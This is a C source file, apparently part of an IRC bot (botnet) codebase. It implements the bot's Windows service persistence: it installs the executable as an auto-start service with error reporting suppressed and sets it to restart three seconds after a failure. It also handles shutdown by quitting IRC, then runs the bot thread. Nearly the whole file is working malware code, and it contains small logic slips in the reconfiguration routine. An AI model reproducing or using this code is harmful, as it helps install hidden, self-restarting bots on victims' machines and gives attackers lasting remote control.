// Thanks to omega_service_.12b.rar, I stole most of the service functions from it
#include "includes.h"
#include "functions.h"

#ifndef NO_SERVICE

SC_HANDLE scm;

extern IRC mainirc;
SERVICE_STATUS ss; 
SERVICE_STATUS_HANDLE ssh; 
VOID WINAPI ShutdownHandler(DWORD Opcode)
{
	DWORD status;
	switch(Opcode)
	{
	case SERVICE_CONTROL_SHUTDOWN:
		if (mainirc.is_connected())
		{
			mainirc.quit("System shutting down.");
			Sleep(FLOOD_DELAY);
			mainirc.disconnect();
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
		ss.dwCurrentState = SERVICE_PAUSED;
		break;
	default:
		break;
	}

	// Send current status. 
	if (!fSetServiceStatus(ssh,&ss))
		status = GetLastError();
	return;
}


int ServiceMain(int argc, char *argv[])
{
	ss.dwServiceType = SERVICE_WIN32; 
	ss.dwCurrentState = SERVICE_START_PENDING; 
	ss.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
	ss.dwWin32ExitCode = 0; 
	ss.dwServiceSpecificExitCode = 0; 
	ss.dwCheckPoint = 0; 
	ss.dwWaitHint = 0; 
	ssh = fRegisterServiceCtrlHandler(servicename,ShutdownHandler);

    // not sure if this is needed for the shutdown handler but why not
    ss.dwCurrentState       = SERVICE_RUNNING; 
    ss.dwCheckPoint         = 0; 
    ss.dwWaitHint           = 0; 
	fSetServiceStatus(ssh,&ss);

	DWORD id;
	HANDLE threadhandle;
	//create a new thread pointing to the function that the service will run
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ServiceThread, NULL, 0, &id)) == 0)
		return 0;
	//waits for the thread to close and handle to end before the function closes.
	WaitForSingleObject(threadhandle, INFINITE);
	
	CloseHandle(threadhandle);
	return 0;
}

BOOL ReconfigureService(LPSTR lpDesc);
int InstallService(char *svcpath)
{
	DWORD le;
	SC_HANDLE service;
    char path[MAX_PATH];

	sprintf(path, "\"%s\"", svcpath);
	
	//open a handle to SCM with the create service flag
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)))
		return 0;
	//install the service pointing to our .exe with full access rights, with its own process, w/o error reporting, with auto start on boot
	if(!(service = fCreateService(scm, servicename, servicedisplayname, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path, NULL, NULL, NULL, NULL, NULL)))
	{
		le=GetLastError();
		//if the service already exists..then run it!
		if(le==ERROR_DUPLICATE_SERVICE_NAME || le==ERROR_SERVICE_EXISTS)
		{
			ServiceRun();
		}
		//some shit happened..service couldn't install
		else
			return 0;
	}
	//no error during install..proceed to run the service
	else
	{
		ReconfigureService(servicedesc);
		ServiceRun();
	}
	//cleanup
	fCloseServiceHandle(service);
	fCloseServiceHandle(scm);
	
	return 0;
}

int ServiceRun() 
{ 
    SC_HANDLE service;
//	SERVICE_STATUS status; 
	
	//open a handle to SCM with full control rights
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)))
		return 0;
	//gain a handle to our service (ServiceName) with full rights
	if(!(service = fOpenService(scm, servicename, SERVICE_ALL_ACCESS)))
		return 0;
	//start the service w/o argument strings.
	if(fStartService(service, 0, NULL) == 0)
		return 0;
	//cleanup
	fCloseServiceHandle(scm);
    fCloseServiceHandle(service); 
    return 0;
}

DWORD WINAPI ServiceThread(LPVOID param)
{
	DWORD id;
	HANDLE threadhandle;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BotThread, NULL, 0, &id)) == 0)
		return 0;
	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
	ExitThread(0);
}

BOOL ReconfigureService(LPSTR lpDesc) 
{ 
    SC_HANDLE service;
	SC_LOCK sclLock; 
	SC_ACTION scBuf;
	LPQUERY_SERVICE_LOCK_STATUS lpqslsBuf; 
	SERVICE_DESCRIPTION sdBuf;
	SERVICE_FAILURE_ACTIONS sfBuf;
	DWORD dwBytesNeeded; 
	BOOL bSuccess=TRUE;

	//open a handle to SCM with full control rights
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)))
		return FALSE;
	//gain a handle to our service (ServiceName) with full rights
	if(!(service = fOpenService(scm, servicename, SERVICE_ALL_ACCESS)))
		return FALSE;
	
	//need to acquire database lock before reconfiguring. 
	//if the database cannot be locked, report the details. 
	if (!(sclLock = fLockServiceDatabase(scm))) 
	{
		if (GetLastError() != ERROR_SERVICE_DATABASE_LOCKED) 
			return FALSE;

		// Allocate a buffer to get details about the lock.
		lpqslsBuf = (LPQUERY_SERVICE_LOCK_STATUS) LocalAlloc(LPTR,sizeof(QUERY_SERVICE_LOCK_STATUS)+256); 
		if (lpqslsBuf == NULL) 
			return FALSE;
 
		// Get and print the lock status information. 
		if (!fQueryServiceLockStatus(scm, lpqslsBuf, sizeof(QUERY_SERVICE_LOCK_STATUS)+256, &dwBytesNeeded)) 
			return FALSE;

		/*if (lpqslsBuf->fIsLocked)
		{
#ifdef _DEBUG
			printf("Locked by: %s, duration: %d seconds\n",lpqslsBuf->lpLockOwner,lpqslsBuf->dwLockDuration); 
#endif
		}*/

		LocalFree(lpqslsBuf); 
	}

	// The database is locked, so it is safe to make changes. 
	// Open a handle to the service. 
	scm = fOpenService(scm, servicename, SERVICE_CHANGE_CONFIG);
	if (service == NULL) 
		return FALSE;

	scBuf.Delay=3000;
	scBuf.Type=SC_ACTION_RESTART;

	sfBuf.lpsaActions=&scBuf;
	sfBuf.cActions=1;
	sfBuf.lpCommand=0;
	sfBuf.lpRebootMsg=0;
	sfBuf.dwResetPeriod=10;

	if(!fChangeServiceConfig2(service, SERVICE_CONFIG_FAILURE_ACTIONS, &sfBuf))
		bSuccess = FALSE;

	sdBuf.lpDescription = lpDesc;

	if(!fChangeServiceConfig2(service, SERVICE_CONFIG_DESCRIPTION, &sdBuf))
		bSuccess = FALSE;

	// Release the database lock. 
	fUnlockServiceDatabase(sclLock); 

	fCloseServiceHandle(service);
	fCloseServiceHandle(scm);

	return bSuccess;
}
#endif